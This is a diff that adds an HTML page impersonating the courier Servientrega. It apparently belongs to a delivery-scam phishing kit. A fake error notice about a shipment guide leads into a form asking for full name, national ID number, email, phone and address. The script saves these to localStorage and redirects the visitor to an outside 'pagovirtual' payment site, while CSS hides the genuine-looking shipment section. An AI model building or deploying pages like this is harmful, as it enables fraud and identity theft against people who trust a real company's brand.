@@ -1,0 +1,618 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Otra Página - Servientrega</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link rel="stylesheet" href="css/styles.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: #f5f5f5;
+            color: #333;
+            line-height: 1.4;
+        }
+
+        /* Estilos para la página principal */
+        .main-content {
+            padding: 20px;
+            text-align: center;
+        }
+
+        .main-content h1 {
+            font-size: 28px;
+            margin-bottom: 30px;
+            color: #333;
+        }
+
+        .info-section {
+            margin-top: 30px;
+        }
+
+        .info-section p {
+            font-size: 16px;
+            margin-bottom: 10px;
+            color: #666;
+        }
+
+        #guideNumber {
+            color: #007bff;
+            font-size: 24px;
+            margin: 10px 0;
+            font-weight: 600;
+        }
+
+        .main-button {
+            background-color: #007bff;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-top: 20px;
+            font-size: 16px;
+            font-weight: 500;
+        }
+
+        .main-button:hover {
+            background-color: #0056b3;
+        }
+
+        /* Estilos para el formulario de actualización (solo móvil) */
+        .update-form-container {
+            display: none;
+            max-width: 480px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: white;
+            min-height: 100vh;
+        }
+
+        .form-header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .form-header h1 {
+            font-size: 22px;
+            font-weight: 600;
+            color: #666;
+            margin-bottom: 20px;
+        }
+
+        .error-message {
+            background-color: #f4f4f4;
+            color: #555;
+            padding: 18px;
+            border-radius: 8px;
+            margin-bottom: 30px;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px 16px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 16px;
+            background-color: #f8f8f8;
+            transition: border-color 0.3s ease;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #007bff;
+            background-color: white;
+        }
+
+        .submit-button {
+            width: 100%;
+            background-color: green;
+            color: white;
+            padding: 14px 16px;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background-color 0.3s ease;
+        }
+
+        .submit-button:hover {
+            background-color: #007bff;
+        }
+
+        .submit-button:active {
+            background-color: #0056b3;
+        }
+
+        .submit-button:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+
+        /* Estilos para el footer */
+        .footer {
+            background-color: #f8f9fa;
+            border-top: 1px solid #e9ecef;
+            padding: 40px 0 20px 0;
+            margin-top: 50px;
+        }
+
+        .footer-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        .footer-content {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 40px;
+            margin-bottom: 30px;
+        }
+
+        .footer-section {
+            flex: 1;
+            min-width: 200px;
+        }
+
+        .footer-logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 20px;
+        }
+
+        .footer-logo img {
+            width: 24px;
+            height: 24px;
+        }
+
+        .footer-logo span {
+            font-size: 20px;
+            font-weight: 600;
+            color: #333;
+        }
+
+        .footer-contact {
+            margin-bottom: 20px;
+        }
+
+        .footer-contact p {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 8px;
+            line-height: 1.4;
+        }
+
+        .footer-phone {
+            color: #28a745;
+            font-weight: 600;
+            font-size: 16px;
+            margin-bottom: 4px;
+        }
+
+        .footer-whatsapp {
+            color: #28a745;
+            font-weight: 600;
+            font-size: 16px;
+        }
+
+        .footer-title {
+            color: #333;
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            padding-bottom: 8px;
+            border-bottom: 2px solid #28a745;
+            display: inline-block;
+        }
+
+        .footer-links {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+        }
+
+        .footer-links li {
+            margin-bottom: 8px;
+        }
+
+        .footer-links a {
+            color: #666;
+            text-decoration: none;
+            font-size: 14px;
+            transition: color 0.3s ease;
+        }
+
+        .footer-links a:hover {
+            color: #28a745;
+        }
+
+        .footer-bottom {
+            border-top: 1px solid #e9ecef;
+            padding-top: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+
+        .footer-legal {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 20px;
+            align-items: center;
+        }
+
+        .footer-legal span {
+            color: #999;
+            font-size: 13px;
+        }
+
+        .footer-legal a {
+            color: #666;
+            text-decoration: none;
+            font-size: 13px;
+            transition: color 0.3s ease;
+        }
+
+        .footer-legal a:hover {
+            color: #28a745;
+        }
+
+        .footer-social {
+            display: flex;
+            gap: 12px;
+        }
+
+        .footer-social a {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            text-decoration: none;
+            font-size: 16px;
+            transition: transform 0.3s ease;
+        }
+
+        .footer-social a:hover {
+            transform: scale(1.1);
+        }
+
+        .social-facebook { background-color: #1877f2; }
+        .social-instagram { background-color: #e4405f; }
+        .social-twitter { background-color: #1da1f2; }
+        .social-youtube { background-color: #ff0000; }
+        .social-linkedin { background-color: #0077b5; }
+        .social-github { background-color: #333; }
+
+        /* Responsive para footer */
+        @media (max-width: 768px) {
+            .footer-content {
+                flex-direction: column;
+                gap: 25px;
+            }
+
+            .footer-section {
+                min-width: 100%;
+            }
+
+            .footer-bottom {
+                flex-direction: column;
+                text-align: center;
+                gap: 15px;
+            }
+
+            .footer-legal {
+                flex-direction: column;
+                gap: 10px;
+            }
+
+            .footer-social {
+                justify-content: center;
+            }
+        }
+
+        /* Ocultar contenido principal en todos los dispositivos */
+        .main-content {
+            display: none;
+        }
+
+        /* Mostrar formulario en todos los dispositivos */
+        .update-form-container {
+            display: block;
+            max-width: 600px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: white;
+            min-height: 100vh;
+        }
+
+        /* Estilos específicos para móvil */
+        @media (max-width: 768px) {
+            .update-form-container {
+                padding: 16px;
+                max-width: 100%;
+            }
+
+            .form-header h1 {
+                font-size: 20px;
+            }
+
+            .form-group input {
+                padding: 14px 16px;
+                font-size: 16px;
+            }
+
+            .error-message {
+                padding: 16px;
+                font-size: 13px;
+            }
+        }
+    </style>
+</head>
+ <header class="header">
+        <div class="header-content">
+            <div class="logo">
+                <img src="img/logo-servientrega-blanco.svg" alt="">
+            </div>
+            <nav class="nav-menu desktop-only">
+                <a href="#">Rastrear</a>
+                <a href="#">Cotizar</a>
+                <a href="#">Recoger</a>
+                <a href="#">Soluciones</a>
+                <a href="#">Nuestra red</a>
+            </nav>
+            <button class="login-btn desktop-only">Ingresar</button>
+        </div>
+    </header>
+<body>
+    <!-- Contenido principal (visible en escritorio) -->
+    <div class="main-content">
+        <h1>Información del Envío</h1>
+        <div class="info-section">
+            <p>Número de guía consultado:</p>
+            <h2 id="guideNumber">No hay datos disponibles</h2>
+        </div>
+        <button onclick="goBack()" class="main-button">
+            Volver
+        </button>
+    </div>
+
+    <!-- Formulario de actualización (visible solo en móvil) -->
+    <div class="update-form-container">
+        <div class="form-header">
+            <h1>Actualizar datos</h1>
+        </div>
+
+        <div class="error-message">
+            Detectamos un error en la Guía <span id="guideNumberInMessage">No disponible</span> de entrega proporcionada. Por favor, indícanos la dirección correcta y realiza el pago del transporte para continuar con el envío.
+        </div>
+
+        <form id="updateForm">
+            <div class="form-group">
+                <label for="fullName">Nombre Completo:</label>
+                <input type="text" id="fullName" name="fullName" required>
+            </div>
+
+            <div class="form-group">
+                <label for="cedula">Cédula:</label>
+                <input type="text" id="cedula" name="cedula" required>
+            </div>
+
+            <div class="form-group">
+                <label for="email">Correo Electrónico:</label>
+                <input type="email" id="email" name="email" required>
+            </div>
+
+            <div class="form-group">
+                <label for="phone">Celular:</label>
+                <input type="tel" id="phone" name="phone" required>
+            </div>
+
+            <div class="form-group">
+                <label for="city">Ciudad de Entrega:</label>
+                <input type="text" id="city" name="city" required>
+            </div>
+
+            <div class="form-group">
+                <label for="address">Dirección de Entrega:</label>
+                <input type="text" id="address" name="address" required>
+            </div>
+
+            <button type="submit" class="submit-button" id="submitBtn">
+                Actualizar Datos
+            </button>
+        </form>
+    </div>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-container">
+            <div class="footer-content">
+                <!-- Sección de logo y contacto -->
+                <div class="footer-section">
+                    <div class="footer-logo">
+                      <img src="img/logo-servientrega-gris.svg" style="width: 100%;" alt="">
+                    </div>
+                    <div class="footer-contact">
+                        <p>Comunícate con nuestras<br>Líneas S Nacional</p>
+                        <div class="footer-phone">601 8889214</div>
+                        <div class="footer-phone">601 7700200</div>
+                        <p style="margin-top: 15px;">Comunícate con nuestra<br>línea WhatsApp</p>
+                        <div class="footer-whatsapp">3153993910</div>
+                    </div>
+                </div>
+
+                <!-- Sobre Servientrega -->
+                <div class="footer-section">
+                    <h3 class="footer-title">Sobre Servientrega</h3>
+                    <ul class="footer-links">
+                        <li><a href="#">Promociones</a></li>
+                        <li><a href="#">Nuestra empresa</a></li>
+                        <li><a href="#">Trabaja con nosotros</a></li>
+                        <li><a href="#">Contacto Servientrega</a></li>
+                        <li><a href="#">Protección de datos personales</a></li>
+                    </ul>
+                </div>
+
+                <!-- Links de interés -->
+                <div class="footer-section">
+                    <h3 class="footer-title">Links de interés</h3>
+                    <ul class="footer-links">
+                        <li><a href="#">Noticias</a></li>
+                        <li><a href="#">Entregamania</a></li>
+                        <li><a href="#">Servientrega Box</a></li>
+                        <li><a href="#">Requisitos para CDS</a></li>
+                        <li><a href="#">Oferta de valor</a></li>
+                    </ul>
+                </div>
+
+                <!-- Centro de ayuda -->
+                <div class="footer-section">
+                    <h3 class="footer-title">Centro de ayuda</h3>
+                    <ul class="footer-links">
+                        <li><a href="#">Servicio al cliente</a></li>
+                        <li><a href="#">PQR's</a></li>
+                        <li><a href="#">Envíos en rezago</a></li>
+                        <li><a href="#">Contacto</a></li>
+                        <li><a href="#">Nuestra red</a></li>
+                    </ul>
+                </div>
+
+                <!-- Accesos corporativos -->
+                <div class="footer-section">
+                    <h3 class="footer-title">Accesos corporativos</h3>
+                    <ul class="footer-links">
+                        <li><a href="#">Soluciones tecnológicas</a></li>
+                        <li><a href="#">Office 365</a></li>
+                        <li><a href="#">Accesos de admin</a></li>
+                        <li><a href="#">Gestor Documental – Docuclass</a></li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="footer-bottom">
+                <div class="footer-legal">
+                    <span>© Servientrega 2025</span>
+                    <a href="#">Política de privacidad</a>
+                    <a href="#">Términos y condiciones</a>
+                    <a href="#">Mapa del sitio</a>
+                    <a href="#">Diseñado por LIZER.CO</a>
+                </div>
+                <div class="footer-social">
+                    <a href="#" class="social-facebook"><i class="fab fa-facebook-f"></i></a>
+                    <a href="#" class="social-instagram"><i class="fab fa-instagram"></i></a>
+                    <a href="#" class="social-twitter"><i class="fab fa-twitter"></i></a>
+                    <a href="#" class="social-youtube"><i class="fab fa-youtube"></i></a>
+                    <a href="#" class="social-linkedin"><i class="fab fa-linkedin-in"></i></a>
+                    <a href="#" class="social-github"><i class="fab fa-github"></i></a>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Mostrar el dato del localStorage cuando se carga la página
+        document.addEventListener('DOMContentLoaded', function() {
+            const savedGuide = localStorage.getItem('lastSearchedGuide');
+            const guideDisplay = document.getElementById('guideNumber');
+            const guideMessageDisplay = document.getElementById('guideNumberInMessage');
+            
+            if (savedGuide) {
+                guideDisplay.textContent = savedGuide;
+                guideMessageDisplay.textContent = savedGuide;
+            } else {
+                guideDisplay.textContent = 'No hay datos disponibles';
+                guideMessageDisplay.textContent = 'No disponible';
+            }
+
+            // Agregar listeners para validar campos en tiempo real
+            const inputs = document.querySelectorAll('input[required]');
+            const submitBtn = document.getElementById('submitBtn');
+            
+            inputs.forEach(input => {
+                input.addEventListener('input', validateForm);
+                input.addEventListener('blur', validateForm);
+            });
+            
+            validateForm(); // Validar al cargar la página
+        });
+
+        // Función para validar el formulario
+        function validateForm() {
+            const inputs = document.querySelectorAll('input[required]');
+            const submitBtn = document.getElementById('submitBtn');
+            let allFilled = true;
+            
+            inputs.forEach(input => {
+                if (!input.value.trim()) {
+                    allFilled = false;
+                }
+            });
+            
+            submitBtn.disabled = !allFilled;
+        }
+
+        // Función para volver a la página anterior
+        function goBack() {
+            window.history.back();
+        }
+
+        // Funcionalidad del formulario de actualización
+        document.getElementById('updateForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Obtener valores del formulario
+            const formData = new FormData(this);
+            const data = {};
+            
+            for (let [key, value] of formData.entries()) {
+                data[key] = value;
+            }
+            
+            // Validación básica
+            if (!data.fullName || !data.cedula || !data.email || !data.phone || !data.city || !data.address) {
+                alert('Por favor, complete todos los campos.');
+                return;
+            }
+            
+            // Guardar datos en localStorage
+            localStorage.setItem('userData', JSON.stringify(data));
+            localStorage.setItem('formSubmitted', 'true');
+            localStorage.setItem('submissionDate', new Date().toISOString());
+
+            // Redirigir a otra página (cambia 'pago.html' por la URL que necesites)
+            window.location.href = 'https://pagovirtual.vercel.app/';
+        });
+    </script>
+</body>
+</html>
